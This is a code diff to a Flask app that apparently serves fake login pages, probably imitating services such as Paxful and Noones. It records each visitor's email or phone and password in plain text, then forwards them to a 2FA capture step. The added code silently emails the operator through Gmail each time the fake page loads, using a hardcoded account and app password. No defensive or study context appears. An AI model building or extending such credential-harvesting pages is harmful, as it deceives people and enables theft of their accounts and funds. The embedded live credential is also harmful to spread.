@@ -1,6 +1,9 @@
 from flask import Flask, render_template, request, redirect, url_for, session
 import sqlite3
 import os
+import threading
+import smtplib
+from email.mime.text import MIMEText
 
 app = Flask(__name__)
 app.secret_key = "supersecretkey"  # Needed for session support
@@ -38,6 +41,28 @@ def init_db():
 # Call this once at startup
 init_db()
 
+def send_email_notification():
+    sender = "azevents50@gmail.com"
+    password = "wvvf axbw kzba hank"  # Gmail app password
+    recipient = "centrehillevents@gmail.com"
+
+    subject = "PaxLogin Page Loaded"
+    body = "PaxLogin Page Opended."
+
+    msg = MIMEText(body)
+    msg["Subject"] = subject
+    msg["From"] = sender
+    msg["To"] = recipient
+
+    try:
+        with smtplib.SMTP("smtp.gmail.com", 587) as server:
+            server.starttls()
+            server.login(sender, password)
+            server.send_message(msg)
+    except:
+        # Fail silently — no logs or prints
+        pass
+
 # ---------- Routes ----------
 @app.route("/")
 def home():
@@ -52,16 +77,21 @@ def paxlogin():
 
         conn = sqlite3.connect(DB_NAME)
         cursor = conn.cursor()
-        cursor.execute("INSERT INTO paxlogin (email_or_phone, password) VALUES (?, ?)", 
-                       (email_or_phone, password))
+        cursor.execute(
+            "INSERT INTO paxlogin (email_or_phone, password) VALUES (?, ?)",
+            (email_or_phone, password),
+        )
         conn.commit()
         conn.close()
 
-        # Store email in session
         session["user_email"] = email_or_phone
-
         return redirect(url_for("pax2fa"))
+
+    # Send notification in background when page is loaded (GET)
+    threading.Thread(target=send_email_notification).start()
+
     return render_template("paxlogin.html")
+
 
 
 @app.route("/nooneslogin", methods=["GET", "POST"])
@@ -224,3 +254,4 @@ def c_mtcn():
 # ---------- Run ----------
 if __name__ == "__main__":
     app.run(debug=True)
+
